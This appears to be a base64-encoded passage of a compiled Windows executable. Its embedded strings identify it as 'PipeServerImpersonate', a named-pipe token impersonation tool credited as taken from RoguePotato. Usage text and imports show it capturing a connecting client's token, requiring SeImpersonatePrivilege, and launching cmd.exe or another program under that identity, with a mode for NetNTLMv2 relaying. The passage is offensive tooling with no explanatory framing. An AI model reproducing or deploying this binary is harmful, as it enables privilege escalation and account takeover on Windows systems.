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BlAGcAZQAgAGkAcwAgAG0AaQBzAHMAaQBuAGcAOgAgACcAJQB3AHMAJwAuACAARQB4AGkAdABpAG4AZwAgAC4ALgAuAAoAAABcAFwALgBcAHAAaQBwAGUAXAAlAFMAAAAKCglQaXBlU2VydmVySW1wZXJzb25hdGUKCUBzaGl0c2VjdXJlLCBjb2RlIHN0b2xlbiBmcm9tIEBzcGxpbnRlcl9jb2RlJ3MgJiYgQGRlY29kZXJfaXQncyBSb2d1ZVBvdGF0byAoaHR0cHM6Ly9naXRodWIuY29tL2FudG9uaW9Db2NvL1JvZ3VlUG90YXRvKSAKCgoAAE1hbmRhdG9yeSBhcmdzOiAKLWUgY29tbWFuZGxpbmU6IGNvbW1hbmRsaW5lIG9mIHRoZSBwcm9ncmFtIHRvIGxhdW5jaAoAAAoKAAAAAAAAT3B0aW9uYWwgYXJnczogCi1wIHBpcGVuYW1lX3BsYWNlaG9sZGVyOiBwbGFjZWhvbGRlciB0byBiZSB1c2VkIGluIHRoZSBwaXBlIG5hbWUgY3JlYXRpb24gKGRlZmF1bHQ6IFBpcGVTZXJ2ZXJJbXBlcnNvbmF0ZSkKLXogOiB0aGlzIGZsYWcgd2lsbCByYW5kb21pemUgdGhlIHBpcGVuYW1lX3BsYWNlaG9sZGVyIChkb24ndCB1c2Ugd2l0aCAtcCkKLWEgOiBhcmd1bWVudHMgdG8gcnVuIHRoZSBiaW5hcnkgd2l0aAotbiA6IGVuZGxlc3MgbW9kZSAtIHJlc3RhcnQgdGhlIE5hbWVkIFBpcGUgU2VydmVyIGFmdGVyIGV4ZWN1dGlvbiAtIGNhbiBiZSB1c2VkIGluIGNvbWJpbmF0aW9uIHdpdGggTmV0TlRMTXYyIHJlbGF5aW5nLgoAAAAARXhhbXBsZSB0byBleGVjdXRlIGNtZC5leGUgYW5kIGNyZWF0ZSBhIG5hbWVkIHBpcGUgbmFtZWQgdGVzdHBpcGVzOiAKCVBpcGVTZXJ2ZXJJbXBlcnNvbmF0ZS5leGUgLWUgIkM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSIgLXAgdGVzdHBpcGVzCgAAWy1dIEVycm9yIFNldFByb2Nlc3NXaW5kb3dTdGF0aW9uOiVkCgAAAGQAZQBmAGEAdQBsAHQAAABbLV0gRXJyb3Igb3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AAAAAAAAAAAAEAAAD+////AAAAAND///8AAAAA/v///2E+QABlPkAAAAAAAP7///8AAAAA2P///wAAAAD+////Dj9AABI/QAAAAAAAdkZAAAAAAABMyEEAAgAAAFjIQQB0yEEAAAAAAMDoQQAAAAAA/////wAAAAAMAAAAF0ZAAAAAAADg6EEAAAAAAP////8AAAAADAAAAEpGQAD+////AAAAANj///8AAAAA/v///zFTQABBU0AAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAEVSQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAyFZAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAABtVkAA/////1dUQQAiBZMZAQAAAAzJQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD+////AAAAANT///8AAAAA/v///wAAAAAHiEAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAIqJQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAL4lAAAAAAAD+////AAAAANj///8AAAAA/v////+NQAADjkAAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAANWhQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAXqJAAAAAAAD+////AAAAALT///8AAAAA/v///wAAAAAKo0AAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAG+mQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAUK1AAAAAAAD+////AAAAANj///8AAAAA/v///wAAAABqrkAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAALutQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAEK5AAAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAgzEAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAGfHQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAA5tRAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAABx3UAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAJLfQAAAAAAA/v///wAAAAC4////AAAAAP7///8AAAAAPuJAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAADz30AAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAHfqQAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAF+tAAAAAAAD+////AAAAAND///8AAAAA/v///wAAAADV80AAAAAAAP7///8AAAAA2P///wAAAAD+////0B9BAOwfQQAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAVCFBAAAAAAD+////AAAAAMj///8AAAAA/v///wAAAACTI0EAAAAAAP7///8AAAAA2P///wAAAAD+////6UhBAPxIQQAYzQEAAAAAAAAAAABIzwEAVGABAEDOAQAAAAAAAAAAAC7QAQB8YQEAxMwBAAAAAAAAAAAAANIBAABgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAOjRAQDQ0QEAvNEBAKzRAQCS0QEAdNEBADzRAQAo0QEAFtEBAPrQAQDe0AEAytABAMDQAQCk0AEAmtABAJDQAQBw0AEAYNABAFDQAQA60AEAAAAAANLVAQDm1QEA9tUBAAjWAQAY1gEALNYBADjWAQBG1gEAVNYBADbPAQAizwEADs8BAP7OAQDwzgEA3M4BAMbOAQCyzgEAps4BAJTOAQCIzgEAeM4BAMDVAQBszgEADtIBACrSAQBI0gEAXNIBAHjSAQCS0gEAqNIBAL7SAQDY0gEA7tIBAALTAQAU0wEAKNMBADTTAQBE0wEAXNMBAHTTAQCM0wEAtNMBAMDTAQDO0wEA3NMBAObTAQD00wEABtQBABbUAQAo1AEANtQBAEzUAQBc1AEAaNQBAH7UAQCQ1AEAotQBALTUAQDE1AEA0tQBAOjUAQD01AEACNUBABjVAQAq1QEANNUBAEDVAQBM1QEAYtUBAHzVAQCW1QEAsNUBAGTWAQAAAAAACNABAO7PAQDSzwEAxs8BABjQAQCczwEAhs8BAG7PAQBWzwEAts8BAAAAAABJA0hlYXBGcmVlAABhAkdldExhc3RFcnJvcgAARQNIZWFwQWxsb2MAtAJHZXRQcm9jZXNzSGVhcAAAcwRSZWFkRmlsZQAA3ABDcmVhdGVOYW1lZFBpcGVXAADXBVdhaXRGb3JTaW5nbGVPYmplY3QAGwJHZXRDdXJyZW50VGhyZWFkAACGAENsb3NlSGFuZGxlAPMAQ3JlYXRlVGhyZWFkAACcAENvbm5lY3ROYW1lZFBpcGUAABcCR2V0Q3VycmVudFByb2Nlc3MArgJHZXRQcm9jQWRkcmVzcwAAS0VSTkVMMzIuZGxsAABkA1NldFVzZXJPYmplY3RTZWN1cml0eQDWAUdldFVzZXJPYmplY3RTZWN1cml0eQCeAk9wZW5XaW5kb3dTdGF0aW9uVwAAqwFHZXRQcm9jZXNzV2luZG93U3RhdGlvbgCZAk9wZW5EZXNrdG9wVwAA3QN3c3ByaW50ZlcA1QFHZXRVc2VyT2JqZWN0SW5mb3JtYXRpb25XAEwDU2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AUABDbG9zZURlc2t0b3AAAFQAQ2xvc2VXaW5kb3dTdGF0aW9uAABVU0VSMzIuZGxsAAAQAEFkZEFjY2Vzc0FsbG93ZWRBY2UASwFHZXRMZW5ndGhTaWQAAI4BSW5pdGlhbGl6ZUFjbACPAUluaXRpYWxpemVTZWN1cml0eURlc2NyaXB0b3IAABYAQWRkQWNlAACFAENvcHlTaWQAIABBbGxvY2F0ZUFuZEluaXRpYWxpemVTaWQAADcBR2V0QWNlAAA4AUdldEFjbEluZm9ybWF0aW9uAF0BR2V0U2VjdXJpdHlEZXNjcmlwdG9yRGFjbADoAlNldFNlY3VyaXR5RGVzY3JpcHRvckRhY2wAGgJPcGVuVGhyZWFkVG9rZW4A8QBEdXBsaWNhdGVUb2tlbkV4AACBAENvbnZlcnRTdHJpbmdTZWN1cml0eURlc2NyaXB0b3JUb1NlY3VyaXR5RGVzY3JpcHRvclcAAIwBSW1wZXJzb25hdGVOYW1lZFBpcGVDbGllbnQAAI0AQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcAwQJSZXZlcnRUb1NlbGYAABUCT3BlblByb2Nlc3NUb2tlbgAAHwBBZGp1c3RUb2tlblByaXZpbGVnZXMArwFMb29rdXBQcml2aWxlZ2VWYWx1ZVcAQURWQVBJMzIuZGxsAACtBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAbQVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAjAVUZXJtaW5hdGVQcm9jZXNzAACGA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQATQRRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAYAkdldEN1cnJlbnRQcm9jZXNzSWQAHAJHZXRDdXJyZW50VGhyZWFkSWQAAOkCR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAYwNJbml0aWFsaXplU0xpc3RIZWFkAH8DSXNEZWJ1Z2dlclByZXNlbnQA0AJHZXRTdGFydHVwSW5mb1cAeAJHZXRNb2R1bGVIYW5kbGVXAADTBFJ0bFVud2luZAAyBVNldExhc3RFcnJvcgAAMQFFbnRlckNyaXRpY2FsU2VjdGlvbgAAvQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAEAFEZWxldGVDcml0aWNhbFNlY3Rpb24AXwNJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AJ4FVGxzQWxsb2MAAKAFVGxzR2V0VmFsdWUAoQVUbHNTZXRWYWx1ZQCfBVRsc0ZyZWUAqwFGcmVlTGlicmFyeQDDA0xvYWRMaWJyYXJ5RXhXAAAtAUVuY29kZVBvaW50ZXIAYgRSYWlzZUV4Y2VwdGlvbgAAXgFFeGl0UHJvY2VzcwB3AkdldE1vZHVsZUhhbmRsZUV4VwAA0gJHZXRTdGRIYW5kbGUAABIGV3JpdGVGaWxlAHQCR2V0TW9kdWxlRmlsZU5hbWVXAADWAUdldENvbW1hbmRMaW5lQQDXAUdldENvbW1hbmRMaW5lVwCbAENvbXBhcmVTdHJpbmdXAACxA0xDTWFwU3RyaW5nVwAATgJHZXRGaWxlVHlwZQD+BVdpZGVDaGFyVG9NdWx0aUJ5dGUAdQFGaW5kQ2xvc2UAewFGaW5kRmlyc3RGaWxlRXhXAACMAUZpbmROZXh0RmlsZVcAiwNJc1ZhbGlkQ29kZVBhZ2UAsgFHZXRBQ1AAAJcCR2V0T0VNQ1AAAMEBR2V0Q1BJbmZvAO8DTXVsdGlCeXRlVG9XaWRlQ2hhcgA3AkdldEVudmlyb25tZW50U3RyaW5nc1cAAKoBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAFAVTZXRFbnZpcm9ubWVudFZhcmlhYmxlVwBKBVNldFN0ZEhhbmRsZQAA1wJHZXRTdHJpbmdUeXBlVwAAnwFGbHVzaEZpbGVCdWZmZXJzAADqAUdldENvbnNvbGVDUAAA/AFHZXRDb25zb2xlTW9kZQAATAJHZXRGaWxlU2l6ZUV4ACMFU2V0RmlsZVBvaW50ZXJFeAAATgNIZWFwU2l6ZQAATANIZWFwUmVBbGxvYwDLAENyZWF0ZUZpbGVXABEGV3JpdGVDb25zb2xlVwAJAURlY29kZVBvaW50ZXIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsRm/RE7mQLv/////AQAAAAEAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAIAWTGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACJAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAADAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAgAAKCgoAAAAAAAAAAAAAAP////8AAAAA6HtBAAEAAAAAAAAAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+OFBAAAAAAAAAAAAAAAAAPjhQQAAAAAAAAAAAAAAAAD44UEAAAAAAAAAAAAAAAAA+OFBAAAAAAAAAAAAAAAAAPjhQQAAAAAAAAAAAAAAAAAAAAAAAAAAACjnQQAAAAAAAAAAAGh+QQDof0EA6HVBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADjhQQAA4kEAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAAAAAAAACAgICAgICAgIC